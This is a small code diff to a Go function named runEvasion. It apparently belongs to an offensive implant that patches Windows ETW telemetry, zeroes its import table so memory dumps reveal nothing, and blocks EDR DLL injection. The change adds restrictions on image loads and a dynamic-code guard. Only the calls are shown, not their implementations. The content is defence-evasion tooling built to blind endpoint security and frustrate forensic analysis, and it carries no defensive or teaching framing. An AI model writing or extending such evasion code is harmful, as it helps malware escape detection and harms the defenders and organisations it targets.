@@ -15,5 +15,7 @@ func runEvasion() {
 	patchETW()
 	patchEtwRegister() // block future ETW provider registrations
 	iatStomp()         // zero IAT so memory dumps reveal no imports
-	blockNonMicrosoftDLLs() // prevent EDR DLL injection — must be last
+	blockNonMicrosoftDLLs() // prevent EDR DLL injection
+	restrictImageLoad()      // block remote/low-IL image loads, prefer System32
+	blockDynamicCode()       // ACG: no new RWX pages after this point — must be last
 }
